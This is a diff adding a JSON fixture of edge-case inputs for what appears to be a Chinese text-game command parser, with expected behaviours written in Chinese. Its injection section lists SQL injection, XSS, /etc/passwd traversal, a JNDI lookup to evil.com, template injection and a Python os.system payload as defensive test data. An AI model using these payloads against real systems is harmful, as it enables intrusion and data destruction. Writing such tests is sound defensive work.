@@ -1,0 +1,282 @@
+{
+  "edge_cases": [
+    {
+      "category": "empty_inputs",
+      "cases": [
+        {
+          "input": "",
+          "expected_behavior": "返回默认响应或提示输入命令"
+        },
+        {
+          "input": "   ",
+          "expected_behavior": "忽略空白字符，返回默认响应"
+        },
+        {
+          "input": "\n\n\n",
+          "expected_behavior": "忽略换行符，返回默认响应"
+        },
+        {
+          "input": "\t\t\t",
+          "expected_behavior": "忽略制表符，返回默认响应"
+        }
+      ]
+    },
+    {
+      "category": "oversized_inputs",
+      "cases": [
+        {
+          "input": "重复字符串：{'探索' * 1000}",
+          "expected_behavior": "截断到合理长度并处理"
+        },
+        {
+          "input": "超长单词：{'a' * 10000}",
+          "expected_behavior": "拒绝处理并返回错误提示"
+        },
+        {
+          "input": "大量空格：{' ' * 5000}中间有内容{' ' * 5000}",
+          "expected_behavior": "清理空格后正常处理"
+        }
+      ]
+    },
+    {
+      "category": "special_characters",
+      "cases": [
+        {
+          "input": "使用道具[破天剑]",
+          "expected_behavior": "正确识别方括号内的道具名"
+        },
+        {
+          "input": "前往<幽冥谷>",
+          "expected_behavior": "正确识别尖括号内的地点"
+        },
+        {
+          "input": "与NPC{商人}对话",
+          "expected_behavior": "正确识别花括号内的NPC"
+        },
+        {
+          "input": "使用技能|烈火剑|",
+          "expected_behavior": "正确识别竖线分隔的技能"
+        },
+        {
+          "input": "查看物品(稀有)",
+          "expected_behavior": "正确识别括号内的属性"
+        },
+        {
+          "input": "执行命令: 探索; 战斗; 逃跑",
+          "expected_behavior": "识别为命令序列"
+        }
+      ]
+    },
+    {
+      "category": "unicode_edge_cases",
+      "cases": [
+        {
+          "input": "使用表情😊战斗💪",
+          "expected_behavior": "过滤表情符号或正常处理"
+        },
+        {
+          "input": "零宽字符测试​​​",
+          "expected_behavior": "忽略零宽字符"
+        },
+        {
+          "input": "组合字符测试：é è ê ë",
+          "expected_behavior": "正确处理组合字符"
+        },
+        {
+          "input": "特殊空格：　全角空格　测试",
+          "expected_behavior": "识别并处理全角空格"
+        },
+        {
+          "input": "控制字符：\u0001\u0002\u0003",
+          "expected_behavior": "过滤控制字符"
+        }
+      ]
+    },
+    {
+      "category": "injection_attempts",
+      "cases": [
+        {
+          "input": "'; DROP TABLE users; --",
+          "expected_behavior": "SQL注入防护，作为普通文本处理"
+        },
+        {
+          "input": "<script>alert('xss')</script>",
+          "expected_behavior": "XSS防护，转义或过滤"
+        },
+        {
+          "input": "../../etc/passwd",
+          "expected_behavior": "路径遍历防护"
+        },
+        {
+          "input": "${jndi:ldap://evil.com/a}",
+          "expected_behavior": "JNDI注入防护"
+        },
+        {
+          "input": "{{7*7}}",
+          "expected_behavior": "模板注入防护"
+        },
+        {
+          "input": "__import__('os').system('ls')",
+          "expected_behavior": "Python代码注入防护"
+        }
+      ]
+    },
+    {
+      "category": "malformed_json",
+      "cases": [
+        {
+          "input": "{\"command\": \"explore\"",
+          "expected_behavior": "处理不完整的JSON"
+        },
+        {
+          "input": "{command: explore}",
+          "expected_behavior": "处理无引号的JSON"
+        },
+        {
+          "input": "{'command': 'explore'}",
+          "expected_behavior": "处理单引号JSON"
+        },
+        {
+          "input": "{\"command\": \"explore\", \"args\": [1, 2, 3,]}",
+          "expected_behavior": "处理尾随逗号"
+        }
+      ]
+    },
+    {
+      "category": "mixed_languages",
+      "cases": [
+        {
+          "input": "Hello世界こんにちは",
+          "expected_behavior": "处理多语言混合输入"
+        },
+        {
+          "input": "使用skill「破天斬」",
+          "expected_behavior": "处理中日文混合"
+        },
+        {
+          "input": "GO TO 东方city",
+          "expected_behavior": "处理中英文混合"
+        },
+        {
+          "input": "アイテムを使う「回血丹」",
+          "expected_behavior": "处理日文命令"
+        }
+      ]
+    },
+    {
+      "category": "numeric_edge_cases",
+      "cases": [
+        {
+          "input": "使用物品 x 99999999999",
+          "expected_behavior": "处理超大数字"
+        },
+        {
+          "input": "移动 -100 步",
+          "expected_behavior": "处理负数"
+        },
+        {
+          "input": "使用 0.5 个药品",
+          "expected_behavior": "处理小数"
+        },
+        {
+          "input": "第１２３个任务",
+          "expected_behavior": "处理全角数字"
+        },
+        {
+          "input": "使用 NaN 个物品",
+          "expected_behavior": "处理非数字"
+        },
+        {
+          "input": "获得 ∞ 经验",
+          "expected_behavior": "处理无穷大"
+        }
+      ]
+    },
+    {
+      "category": "context_edge_cases",
+      "cases": [
+        {
+          "input": "继续",
+          "context": [],
+          "expected_behavior": "无上下文时合理处理"
+        },
+        {
+          "input": "同意",
+          "context": "corrupted",
+          "expected_behavior": "损坏的上下文时降级处理"
+        },
+        {
+          "input": "使用它",
+          "context": "超长上下文（10000条消息）",
+          "expected_behavior": "压缩或截断上下文"
+        },
+        {
+          "input": "重复上一个操作",
+          "context": "循环引用的上下文",
+          "expected_behavior": "检测并打破循环"
+        }
+      ]
+    },
+    {
+      "category": "timing_edge_cases",
+      "cases": [
+        {
+          "input": "快速连续发送100个相同命令",
+          "expected_behavior": "去重或限流"
+        },
+        {
+          "input": "极慢输入（每个字符间隔1秒）",
+          "expected_behavior": "正确组装完整命令"
+        },
+        {
+          "input": "并发发送冲突命令",
+          "expected_behavior": "保证数据一致性"
+        }
+      ]
+    },
+    {
+      "category": "encoding_edge_cases",
+      "cases": [
+        {
+          "input": "UTF-8 BOM: \ufeff探索",
+          "expected_behavior": "移除BOM标记"
+        },
+        {
+          "input": "Windows换行: 探索\r\n战斗\r\n",
+          "expected_behavior": "统一换行符"
+        },
+        {
+          "input": "混合编码（假设）",
+          "expected_behavior": "检测并转换编码"
+        }
+      ]
+    },
+    {
+      "category": "semantic_edge_cases",
+      "cases": [
+        {
+          "input": "我想要不想要想要攻击",
+          "expected_behavior": "理解复杂否定"
+        },
+        {
+          "input": "使用第一个背包里的第二个物品的第三个功能",
+          "expected_behavior": "理解嵌套引用"
+        },
+        {
+          "input": "如果我有钱就买药否则就不买",
+          "expected_behavior": "理解条件语句"
+        },
+        {
+          "input": "重复10次：攻击",
+          "expected_behavior": "理解循环指令"
+        }
+      ]
+    }
+  ],
+  "metadata": {
+    "version": "1.0",
+    "total_categories": 12,
+    "total_cases": 60,
+    "purpose": "边界情况测试，确保系统稳定性"
+  }
+}
